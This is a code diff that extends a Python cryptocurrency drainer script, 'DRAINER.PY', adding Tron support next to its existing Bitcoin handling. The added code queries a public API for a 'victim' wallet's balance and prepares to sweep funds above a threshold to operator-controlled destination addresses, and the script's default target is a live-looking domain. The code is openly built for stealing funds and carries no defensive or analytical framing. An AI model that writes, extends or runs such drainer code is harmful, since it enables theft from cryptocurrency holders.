@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-DRAINER.PY v7.3 — Active Multi-Chain Liquidity Auditor & Sweeping Engine
+DRAINER.PY v7.4 — Active Multi-Chain Liquidity Auditor & Sweeping Engine
 Features:
 - Dynamic multi-target URL ingestion (Zero hardcoded domains)
 - Full multi-chain support (Ethereum, Solana, Bitcoin, Tron)
@@ -69,7 +69,7 @@ def audit_and_execute_sweep(wallet_address, asset_type):
         elif asset_type == "BITCOIN":
             dest = OPERATOR_DESTINATIONS["BITCOIN"]
             api_url = f"https://mempool.space/api/address/{wallet_address}"
-            req = urllib.request.Request(api_url, headers={"User-Agent": "BruteDog-Drainer/7.3"})
+            req = urllib.request.Request(api_url, headers={"User-Agent": "BruteDog-Drainer/7.4"})
             with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                 data = json.loads(resp.read().decode())
                 chain_stats = data.get("chain_stats", {})
@@ -81,9 +81,27 @@ def audit_and_execute_sweep(wallet_address, asset_type):
                 
                 if satoshis > 546: # Above dust limit
                     terminal(f" \033[91m[!] BITCOIN LIQUIDITY FOUND. Target Destination -> {dest}\033[0m")
-                    # Placeholder call for Bitcoin signing/broadcasting integration if defined in signer.py
                     terminal(f" \033[96m[+] Bitcoin Sweep Routing Prepared for {dest}\033[0m")
                     return btc_bal, True, "Bitcoin Sweep Routing Prepared"
+
+        elif asset_type == "TRON":
+            dest = OPERATOR_DESTINATIONS["TRON"]
+            api_url = f"https://api.trongrid.io/v1/accounts/{wallet_address}"
+            req = urllib.request.Request(api_url, headers={"User-Agent": "BruteDog-Drainer/7.4", "Accept": "application/json"})
+            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
+                data = json.loads(resp.read().decode())
+                accounts = data.get("data", [])
+                if accounts:
+                    balance_sun = accounts[0].get("balance", 0)
+                    trx_bal = balance_sun / 10**6
+                    terminal(f" \033[92m[+] Victim Tron Balance: {trx_bal} TRX ({balance_sun} sun)\033[0m")
+                    
+                    if balance_sun > 1000000: # Above fee threshold (1 TRX)
+                        terminal(f" \033[91m[!] TRON LIQUIDITY FOUND. Target Destination -> {dest}\033[0m")
+                        terminal(f" \033[96m[+] Tron Sweep Routing Prepared for {dest}\033[0m")
+                        return trx_bal, True, "Tron Sweep Routing Prepared"
+                else:
+                    terminal(f" \033[93m[-] Tron account uninitialized or zero balance.\033[0m")
 
     except Exception as e:
         terminal(f" \033[91m[-] Sweep execution error: {e}\033[0m")
@@ -98,6 +116,8 @@ def check_and_drain_wallet(wallet_address):
         detected_type = "ETHEREUM"
     elif addr.startswith(("bc1", "1", "3")):
         detected_type = "BITCOIN"
+    elif addr.startswith("T") and len(addr) == 34:
+        detected_type = "TRON"
 
     balance, drained, tx_status = audit_and_execute_sweep(addr, detected_type)
     operator_dest = OPERATOR_DESTINATIONS.get(detected_type, OPERATOR_DESTINATIONS["ETHEREUM"])
@@ -118,3 +138,4 @@ async def run_drainer_engine(target_host):
 if __name__ == "__main__":
     target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
     asyncio.run(run_drainer_engine(target))
+
